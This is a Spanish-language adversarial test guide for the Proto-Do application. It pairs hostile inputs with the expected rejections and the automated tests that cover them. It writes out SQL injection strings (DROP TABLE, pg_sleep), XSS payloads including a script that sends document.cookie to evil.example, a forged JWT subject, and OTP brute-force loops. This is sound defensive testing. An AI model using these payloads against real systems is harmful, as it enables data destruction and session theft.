# Guía de pruebas «a mala leche» — Proto-Do

Esta guía recoge pruebas hechas con la intención de **romper** el sistema: entradas hostiles,
carreras entre usuarios, tokens ya revocados. No basta con comprobar que el camino feliz
funciona. Cada escenario indica el objetivo, el ataque listo para copiar, el resultado esperado y
la prueba automatizada que lo cubre. Si una prueba manual da otro resultado, hay un defecto. No se
ajusta la guía para que cuadre.

> **Dónde ejecutar.** Siempre contra `<nombre_bd_test>` o con un backend arrancado sin efectos
> reales (ver la memoria «Arrancar Nest toca el buzón y la BD reales»):
>
> ```bash
> cd backend
> IMAP_POLLING_ENABLED=false CRON_SCHEDULING_ENABLED=false INBOUND_RESUME_ENABLED=false \
>   DB_NAME='<nombre_bd_test>' PORT=3100 npm run start
> ```
>
> Para los `curl`, toma el access token de una sesión real: DevTools → Network → cualquier
> petición `/api` → cabecera `Authorization`. Exporta `API=http://localhost:3100/api` y
> `TOKEN=<access token>`.

## Cómo ejecutar la batería automatizada

| Capa | Comando | Qué cubre |
|---|---|---|
| Unitarias backend | `cd backend && npx jest` | Estrategia JWT, relevo de tarifas, lista blanca de orden |
| E2E backend (PostgreSQL real) | `cd backend && npm run test:migrate && npm run test:e2e` | Frontera HTTP completa con el `ValidationPipe` de producción |
| Componentes frontend | `cd frontend && npm run test` | Aviso de 5 s, formulario de tarifas, bloqueo de teclas |

El proyecto **no tiene Cypress ni Playwright**. Del lado del navegador, el «e2e» consiste en montar
el componente con Quasar real, un reloj falso y clics sobre el DOM (`WarningModal.spec.ts`). Del
lado del servidor, es `supertest` contra el `AppModule` entero y la base de pruebas
(`input-resilience.e2e-spec.ts`).

---

## 1. Inyección SQL por el orden (`sortBy` / `sortOrder`)

**Objetivo.** TypeORM concatena en crudo el primer argumento de `.orderBy()`: no hay parámetro
enlazado posible para un identificador. Si el texto del cliente llegara hasta ahí, sería una
inyección servida.

**Defensa.** Hay dos líneas de defensa:

1. `@SortByField(claves)` en el DTO rechaza con 400 todo lo que no sea una clave exacta de la lista
   blanca: arrays, objetos, mayúsculas distintas, espacios.
2. `resolveSort` traduce la clave a una ruta escrita en el código fuente. Usa `Object.hasOwn`, así
   que `constructor` y `__proto__` no se cuelan desde el prototipo.

**Ataques** (en los cuatro endpoints: `/executions`, `/telemetry/history`, `/audit/events`,
`/pricing`):

```bash
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN" \
  "$API/pricing?sortBy=validFrom;DROP%20TABLE%20usuarios--"        # 400
curl ... "$API/audit/events?sortBy=(SELECT%20pg_sleep(5))"         # 400, y responde al instante
curl ... "$API/executions?sortBy=1"                                # 400 (orden posicional)
curl ... "$API/telemetry/history?sortBy=constructor"               # 400
curl ... "$API/pricing?sortBy=vigente_desde"                       # 400 (la columna SQL real tampoco vale)
curl ... "$API/pricing?sortBy=aiModel&sortOrder=asc,id"            # 400
curl ... "$API/pricing?sortBy[]=aiModel"                           # 400
```

**Esperado.** Las peticiones hostiles devuelven 400. Ninguna tarda (`pg_sleep` no llega a
ejecutarse). `SELECT count(*) FROM usuarios` sigue devolviendo filas. Las claves válidas, en
`ASC` y en `desc`, devuelven 200.

**Pruebas.** `sort-whitelist.util.spec.ts`; `input-resilience.e2e-spec.ts` §2 (2.1 a 2.4, contra
Postgres real con `JOIN` y `take`/`skip`).

---

## 2. Revocación inmediata del JWT (`tokenVersion`)

**Objetivo.** El access token es autocontenido: el rol viaja firmado en él. Si alguien degrada a un
ADMIN o desactiva su cuenta, ese token tiene que dejar de valer en la **petición siguiente**, sin
esperar a que caduque (`JWT_EXPIRES_IN`).

**Defensa.** Por orden:

- `JwtStrategy.validate` consulta `usuarios.token_version` en cada petición y compara con igualdad
  **estricta**: `'0'` no es `0` y `-1` no es `0`.
- `UsersService` sube el contador al cambiar el rol, el estado o el correo.
- Un `sub` que no sea UUID se rechaza antes de tocar la base de datos.

**Ataques.** Para cada uno:

1. **Revocación en caliente.**
   - Pasos: inicia sesión como EDITOR y copia el token. Desde otra sesión ADMIN, cámbiale el rol o
     desactívalo. Repite cualquier `curl` con el token viejo.
   - Esperado: 401.
2. **Revocación a mano.**
   - Pasos: ejecuta `UPDATE usuarios SET token_version = token_version + 1 WHERE correo = '...';` y
     repite la petición.
   - Esperado: 401.
3. **Token reemitido.**
   - Pasos: vuelve a iniciar sesión y repite la petición.
   - Esperado: 200. Revocar no es bloquear la cuenta.
4. **`sub` hostil firmado** (requiere el `JWT_SECRET`, así que solo simula un secreto filtrado).
   - Pasos: firma un token con `sub = "x' OR '1'='1"` y haz cualquier petición con él.
   - Esperado: **401**. *Hallazgo de esta batería:* antes devolvía **500**, porque el driver lanzaba
     `invalid input syntax for type uuid`, y eso además delataba el motor de base de datos.
     Corregido con `isUUID` en la estrategia.
5. **Firma alterada.**
   - Pasos: cambia los cuatro últimos caracteres del token.
   - Esperado: 401.

**Pruebas.** `jwt.strategy.spec.ts` §2 (revocación en la misma instancia, ADMIN degradado,
generación como texto, negativa, futura o decimal, `sub` no UUID); `input-resilience.e2e-spec.ts`
§4.

---

## 3. Tarifas de IA: el relevo nunca queda a medias

**Objetivo.** Para cada par (proveedor, modelo) hay **exactamente una** tarifa vigente, siempre.
Nunca cero, porque entonces el coste pasaría a «estimado», y nunca dos, porque entonces el coste
dependería de quién ganó una carrera.

**Defensa.** Tres piezas:

- La transacción hace `SELECT … FOR UPDATE`, luego `activo = false` y luego `INSERT`.
- El índice único parcial `uq_precios_modelos_ia_activa` (migración 052) para la carrera sin
  vigente previa.
- No existe ningún endpoint para desactivar o borrar una tarifa.

**Ataques.**

```bash
# Dos (o tres) ADMIN a la vez sobre un par nuevo
for r in 1 2 3; do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/pricing" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"aiProvider\":\"OPENAI\",\"aiModel\":\"carrera-1\",\"promptRateUsdPerMTok\":$r,\"completionRateUsdPerMTok\":1,\"reasoningRateUsdPerMTok\":1}" &
done; wait
# Cada una 201 o 409, nunca 500. Despues:
#   SELECT count(*) FROM precios_modelos_ia WHERE modelo_ia='carrera-1' AND activo;  -> 1

curl -X PATCH  "$API/pricing/<id>" ...   # 404: la ruta no existe
curl -X DELETE "$API/pricing/<id>" ...   # 404
```

- Una tarifa idéntica a la vigente devuelve 409, para no ensuciar el historial.
- Si la base de datos cae a mitad del relevo, el `ROLLBACK` deja la vigente intacta. No se audita
  ni se emite `pricing:updated`: se anuncia un hecho, nunca una intención.
- Un `23505` de **otra** restricción sube tal cual. No se disfraza de «otro ADMIN se adelantó».

**Pruebas.** `pricing.service.spec.ts` §1 y §4; `pricing.controller.spec.ts` 1.4;
`input-resilience.e2e-spec.ts` §1.

---

## 4. XSS en prompts y plantillas

**Objetivo.** El HTML de una plantilla y el texto de un prompt los escribe una persona, y pueden
llevar `<script>`.

**Defensa.**

- **Vista previa de plantillas.** Se muestra en un `<iframe sandbox="">` sin ningún token `allow-*`
  (`TemplatePreviewDialog.vue`), así que no se ejecutan scripts ni formularios.
- **Sin `v-html`.** No hay ninguno en todo `frontend/src`: el único que aparece es un comentario
  que explica por qué no se usa. Vue escapa cualquier interpolación `{{ }}`.
- **Backend.** El backend sanea con `sanitize-html` (`template-renderer.service.ts`) y escapa con
  `escape-html.util.ts`.
- **Identificadores.** En los campos que son identificadores, como el modelo de una tarifa, el DTO
  admite solo `[A-Za-z0-9._:-]` o `*`.

**Ataques.**

- **Prompt** (asistente de optimización o plantilla de prompt IA): pega
  `<img src=x onerror=alert(document.cookie)>` y `"><script>alert(1)</script>`.
  - Esperado: el texto se ve **literal** y no salta ningún `alert`.
- **Plantilla HTML**: añade `<script>fetch('https://evil.example/'+document.cookie)</script>` y
  abre la vista previa.
  - Esperado: el script **no** se ejecuta (iframe aislado) y en Network no sale ninguna petición
    a `evil.example`.
- **Modelo de una tarifa**: `<img src=x onerror=alert(1)>` o `gpt'; DROP TABLE usuarios;--`.
  - Esperado: 400 del DTO y error de validación en el formulario, antes del aviso de 5 s.

**Pruebas.** `pricing.controller.spec.ts` 1.5; `PricingDialog.spec.ts` 1.3;
`input-resilience.e2e-spec.ts` 1.5.

---

## 5. Desbordamiento de búsquedas y parámetros

**Objetivo.** Ni el buscador ni la paginación pueden servir para volcar la tabla ni para provocar
un 500.

**Defensa.**

- **Buscador:** `@TrimmedString`, luego `@MaxLength(100)`.
- **Comodines:** `escapeLike` vuelve literales `%`, `_` y `\` en el `ILIKE`.
- **Paginación:** `limit` de 1 a 100.
- **Parámetros desconocidos:** `forbidNonWhitelisted` rechaza cualquier parámetro que el DTO no
  declare.

**Ataques.**

```bash
curl ... "$API/pricing?search=$(printf 'x%.0s' {1..101})"   # 400
curl ... "$API/pricing?search=%25"                           # 200 con total 0 (el % es literal)
curl ... "$API/pricing?search=%20%20gemini%20%20"            # 200, igual que "gemini"
curl ... "$API/pricing?limit=100000"                         # 400
curl ... "$API/pricing?limit=abc"                            # 400
curl ... "$API/pricing?debug=true"                           # 400
curl ... "$API/pricing?activeOnly=si"                        # 400 (solo true/false literales)
curl ... "$API/pricing?from=2026-10-22&to=2026-10-01"        # 400 (rango invertido)
```

En el cuerpo, un campo de más (`"active": false`, `"validFrom": "2030-01-01"`) también da 400,
nunca se ignora en silencio.

**Pruebas.** `pricing.controller.spec.ts` 1.6; `input-resilience.e2e-spec.ts` §3; `pricing.service.spec.ts` 2.3.

---

## 6. Interfaz: el aviso de 5 segundos y las entradas numéricas

**Objetivo.** Un usuario impaciente no puede saltarse la espera de 5 s al registrar una tarifa
(`frontend-quasar.md` §4). Tampoco puede teclear un número que el backend vaya a rechazar.

**Ataques manuales** en `/precios`:

1. **Pulsar antes de tiempo.**
   - Pasos: pulsa «Registrar tarifa» repetidas veces durante la cuenta atrás.
   - Esperado: el botón está deshabilitado y no ocurre nada.
2. **Ahorrarse la espera a plazos.**
   - Pasos: abre el aviso, espera 4 s, cancela y vuelve a abrirlo.
   - Esperado: la cuenta **reinicia** en 5.
3. **Salir sin confirmar.**
   - Pasos: pulsa `Esc` o haz clic fuera.
   - Esperado: el aviso no se cierra (es persistente). Solo «Cancelar» lo cierra, y no registra nada.
4. **Teclas no válidas en las tarifas.**
   - Pasos: teclea `e`, `E`, `+`, `-` o `,`.
   - Esperado: la tecla no entra. El punto sí entra: es el separador decimal.
5. **Valores fuera de rango.**
   - Pasos: pega `-1`, `0.1234567` o `10000000`.
   - Esperado: error de validación. El formulario no avanza al aviso.
6. **Fechas futuras en el filtro de vigencia.**
   - Pasos: intenta elegir mañana en el calendario, o tecléala.
   - Esperado: el día de mañana aparece deshabilitado y, si se teclea, sale «No se pueden consultar
     fechas futuras».

**Pruebas.** `WarningModal.spec.ts` (reloj falso, incluida la regresión de `SafeDeleteModal`);
`PricingDialog.spec.ts`; `PricingManager.spec.ts`; `numeric-input.spec.ts`.

---

## 7. Límites de tasa (rate limiting)

**Objetivo.** Ni el OTP ni el optimizador de prompts se pueden usar para fuerza bruta, para
inundar el correo de alguien o para disparar la factura de IA.

**Defensa.**

- `@nestjs/throttler` con el throttler `otp`.
- `POST /auth/otp/generate` y `/otp/validate`: por defecto 3 peticiones por minuto
  (`DEFAULT_OTP_THROTTLE_LIMIT`), configurable por `.env`.
- `POST /auth/refresh` y `/auth/logout`: 10 por minuto.
- `POST /prompts/optimize`: 10 por minuto.

**Ataque** (contra el backend de pruebas, con un correo de pruebas):

```bash
for i in $(seq 1 5); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/auth/otp/generate" \
    -H 'Content-Type: application/json' -d '{"email":"qa@unuware.com"}'
done
# Esperado: las tres primeras 2xx/4xx de negocio; a partir de la cuarta, 429.
```

> No está automatizado **a propósito**: cada `otp/generate` válido envía un correo real. Si se
> automatiza, que sea con el transporte SMTP doblado.

**Observación.** `/pricing` no tiene throttle propio. Es ADMIN-only y cada alta exige 5 s de
confirmación en la interfaz, pero la API se puede llamar directamente. Si se considera un riesgo,
se añade `@Throttle` como en `/prompts/optimize`.

---

## 8. Datos de prueba: resguardo y purga

`scripts/purge-test-data.sql` borra los flujos de prueba (con sus ejecuciones, logs, alertas y
telemetría en cascada) y conserva solo los flujos de referencia. **Antes de ejecutarlo:**

1. Detén el backend. Hay flujos `[E2E] Pipeline dummy` en `ACTIVO` con cron programado.
2. Haz el respaldo con `pg_dump`. El comando está en la cabecera del script.
3. Ejecuta primero la variante en seco (con `ROLLBACK`) y revisa los recuentos.
